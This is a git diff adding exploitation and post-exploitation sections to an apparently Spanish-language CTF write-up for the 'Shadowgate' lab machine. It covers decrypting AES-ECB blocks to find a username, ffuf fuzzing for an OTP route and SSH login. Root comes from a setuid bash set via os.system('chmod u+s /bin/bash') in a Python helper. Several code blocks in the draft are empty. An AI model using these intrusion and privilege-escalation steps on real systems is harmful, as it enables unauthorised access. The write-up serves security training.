@@ -52,8 +52,11 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#AES-ECB">Desencriptando Bloques Cifrados con AES-ECB</a></li>
+				<ul>
+					<li><a href="#CyberChefPython">Desencriptando Bloques AES-ECB con CyberChef y Script de Python</a></li>
+				</ul>
+				<li><a href="#fuzz2SSH">Identificando Ruta para Código OTP y Ganando Acceso a la Máquina Víctima Vía SSH</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
@@ -400,44 +403,233 @@ Ahora debemos buscar un usuario válido, pero todo parece indicar que quien ocul
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="AES-ECB">Desencriptando Bloques Cifrados con AES-ECB</h2>
 
-```bash
+Investigando que podríamos hacer con las respuestas del **puerto 56789**, y con ayuda de **ChatGPT**, encontramos lo siguiente:
+* Cada cadena decodificada (a excepción de la primera), tiene un tamaño de 16 bytes.
+* La primer cadena parece más alguna clave, un **salt**, un hash o un seed.
+* La cantidad de bytes de cada cadena, puede que pertenezca al **cifrado AES**.
+* Si las cadenas estan cifradas en **AES**, debemos encontrar el modo de operación para descifrarlas.
 
-```
+Aquí dejo algunas definiciones importantes:
 
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
+| **Cifrado AES** |
+|:---------------:|
+| *Advanced Encryption Standard (AES) es un algoritmo de cifrado simétrico de bloque utilizado para proteger información mediante la transformación de datos en texto cifrado usando una clave secreta. Algunas de sus caracteristicas principales son: es un cifrado simétrico, opera sobre bloques de 128 bits (16 bytes), soporta claves de 128, 192 y 256 bits, etc.* |
 
 <br>
 
-<h2 id=""></h2>
+| **Modo de Operación de AES** |
+|:----------------------------:|
+| *Un modo de operación define cómo aplicar un cifrado de bloque como AES a mensajes de longitud arbitraria, especificando cómo se encadenan o combinan los bloques durante el proceso de cifrado. Existen los siguientes modos: ECB (Electronic Codebook), CBC (Cipher Block Chaining) y CTR (Counter Mode)* |
 
+<br>
+
+No hay una forma clara de que podamos identificar que **modo de operación** se utilizo, por lo que tendremos que probar algunas formas de desencriptar cada bloque en **base64**.
+
+Enfoquemonos en el **modo de operación ECB (Electronic Codebook)**.
+
+El siguiente blog se menciona como desencriptar un bloque que fue encriptado con **AES - ECB**:
+* <a href="https://www.reddit.com/r/AskComputerScience/comments/1n0l1y5/how_do_you_decode_aes_ecb/" target="_blank">Reddit: How do you decode AES ECB?</a>
+
+Para poder hacer esto, necesitaremos lo siguiente:
+* La llave que se uso para encriptar el bloque, convertida en un **Hash SHA256**.
+* El bloque sin que este codificado en **base64**.
+* El **padding**, pero esto depende de la cantidad de bytes del bloque encriptado y los que tenemos son de 16 bytes, lo que indica que no tiene **padding**.
+
+Vemos que tenemos todo, a excepción de la llave, pero como tenemos de pista que puede ser el primer bloque que encontramos, tan solo vamos a convertirla en un **Hash SHA256**:
 ```bash
-
+echo -n "c4f7d35" | sha256sum
+7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75  -
 ```
 
+Y usaremos el siguiente comando para desencriptar el bloque:
 ```bash
+openssl enc -aes-256-ecb -d -K HashCopiadoSHA256 -nopad -in cadena1.bin
+```
+El archivo **cadena.bin**, almacena cualquier cadena decodificada en **base64**.
 
+Probémos:
+```bash
+openssl enc -aes-256-ecb -d -K 7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75 -nopad -in cadena1.bin
+vI-.LGFe+WonYhS~
+```
+Excelente, funcionó. Ahora desencriptemos cada cadena.
+
+<br>
+
+<h3 id="CyberChefPython">Desencriptando Bloques AES-ECB con CyberChef y Script de Python</h3>
+
+Hacerlo una por una es bastante tedioso, por lo que automatizaremos la forma de desencriptar cada cadena de forma rápida.
+
+Primero usaremos **CyberChef**:
+* <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>
+
+Y utilizaremos las siguientes operaciones:
+* **Fork**
+* **From Base64**
+* **AES Decrypt**
+
+Quedaría de la siguiente forma:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura4.png">
+</p>
+
+Excelente, tenemos cada cadena desencriptada.
+
+Ahora bien, también podemos realizarlo con el siguiente script de **Python**:
+```python
+from Crypto.Cipher import AES
+import hashlib
+import base64
+
+seed = "c4f7d35"
+
+# Llave en SHA256
+key = hashlib.sha256(seed.encode()).digest()
+
+# Crear descifrador AES ECB
+cipher = AES.new(key, AES.MODE_ECB)
+
+with open("output.txt") as f:
+    for line in f:
+        block = line.strip()
+        ciphertext = base64.b64decode(block)
+        plaintext = cipher.decrypt(ciphertext)
+        print(plaintext)
+```
+Solo necesitaras guardar todos los bloques que estan en **base64**, a excepción del primero que es la llave, dentro de un archivo de texto con el nombre **output.txt**, pero ese 
+nombre se puede cambiar a tu gusto.
+
+Aparte, necesitaras tener instalada la siguiente librería:
+```bash
+pip3 install pycryptodome
+```
+Te recomiendo hacerlo en un ambiente virtual de **Python**.
+
+Ya solo ejecutalo y observa el resultado:
+```bash
+python3 decryptAES.py
+b'vI-.LGFe+WonYhS~'
+b'4w1[gb=w0#7@`w\\!'
+b'u_Ga.0>?Lq~X?tO#'
+b"1't{Aa(4wJdJAh5]"
+b'tm:gnn8\\j}/[sf#A'
+b'g/i-eS}m}Bpd@9jq'
+b"x)V~LizZz6uR?M'u"
+b'9q7ddl1l>T!EX9Ln'
+```
+En ambos casos, podemos ver que los resultados son muy distintos, pero con la diferencia importante de que el primer caracter nunca cambia.
+
+Si copiamos y pegamos cada caracter inicial dentro de la petición del login, pero como un usuario, obtendremos la siguiente respuesta:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura5.png">
+</p>
+
+Encontramos el usuario correcto, pero nos dice que debemos encontrar una ruta donde colocar un **código OTP** y se nos da uno como una cabecera,
+
+Tendremos que aplicar **Fuzzing** denuevo.
+
+<br>
+
+<h2 id="fuzz2SSH">Identificando Ruta para Código OTP y Ganando Acceso a la Máquina Víctima Vía SSH</h2>
+
+Búsquemos esa ruta con la herramienta **ffuf**:
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -X POST -u http://192.168.100.220:8080/FUZZ -mc 200 -H 'Content-Type: application/x-www-form-urlencoded'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://192.168.100.220:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+login                   [Status: 200, Size: 48, Words: 8, Lines: 1, Duration: 184ms]
+verify                  [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 201ms]
+:: Progress: [128370/128370] :: Job [1/1] :: 254 req/sec :: Duration: [0:11:23] :: Errors: 0 ::
 ```
 
+| Parámetros | Descripción |
+|--------------------------|
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-X*	     | Para indicar un método específico a utilizar. |
+| *-u*       | Para indicar la URL a utilizar. |
+| *-mc*	     | Para indicar un filtro que solo busque resultados con un código de estado específico. |
+| *-H*	     | Para indicar una cabecera específica a usar. |
+
+<br>
+
+Excelente, encontramos la ruta.
+
+Apuntemos a ella desde la petición que capturamos con **BurpSuite** y usemos el parámetro `token=` para ver si funciona:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura6.png">
+</p>
+
+Si funcionó.
+
+Dale el código correcto:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-shadowgate/Captura7.png">
+</p>
+
+Nos dicen que se activo un servicio, pero al escanear la máquina no vemos nada.
+
+Pero al entrar denuevo al **puerto 56789**, obtendremos una respuesta distinta:
 ```bash
-
+nc 192.168.100.220 56789
+Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
+Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
+SSH login for user mars
+mars:**********
+Connection closing...
 ```
+Nos dio credenciales para entrar al **servicio SSH**.
 
+Comprobémos si funcionan:
 ```bash
-
+nxc ssh 192.168.100.220 -u 'mars' -p '**********'
+SSH         192.168.100.220   22     192.168.100.220    [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11
+SSH         192.168.100.220   22     192.168.100.220    [+] mars:**********  Linux - Shell access!
 ```
+Si funcionan.
 
+Entremos:
+```bash
+ssh mars@192.168.100.220
+mars@192.168.100.220's password: 
+Last login: Tue Mar 10 20:43:42 2026
+mars@TheHackersLabs-Shadowgate:~$ whoami
+mars
+```
+Ya estamos dentro.
+
+Aquí encontraremos la flag del usuario:
+```bash
+mars@TheHackersLabs-Shadowgate:~$ ls
+user.txt
+mars@TheHackersLabs-Shadowgate:~$ cat user.txt
+...
+```
 
 
 <br>
@@ -451,6 +643,69 @@ Ahora debemos buscar un usuario válido, pero todo parece indicar que quien ocul
 
 <h2 id=""></h2>
 
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+ssh -L 4444:0.0.0.0:4444 mars@192.168.100.220
+mars@192.168.100.220's password: 
+Last login: Mon Mar 16 04:51:52 2026
+mars@TheHackersLabs-Shadowgate:~$
+```
+
+```bash
+nc 127.0.0.1 4444
+Welcome to Shadow Client Helper
+This is an unrestricted environment. Good luck, hacker.
+>>>
+```
+
+
+```bash
+mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
+```
+
+```bash
+>>> import os 
+>>> os.system('chmod u+s /bin/bash')
+```
+
+```bash
+mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
+```
+
+```bash
+mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ bash -p
+bash-5.2# whoami
+root
+```
+
+```bash
+bash-5.2# cd /root
+bash-5.2# ls
+root.txt
+bash-5.2# cat root.txt
+...
+```
 
 
 
@@ -462,10 +717,13 @@ Ahora debemos buscar un usuario válido, pero todo parece indicar que quien ocul
 </div>
 
 
-links
+* https://www.reddit.com/r/AskComputerScience/comments/1n0l1y5/how_do_you_decode_aes_ecb/
+* https://gchq.github.io/CyberChef/
+* https://github.com/peass-ng/PEASS-ng
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
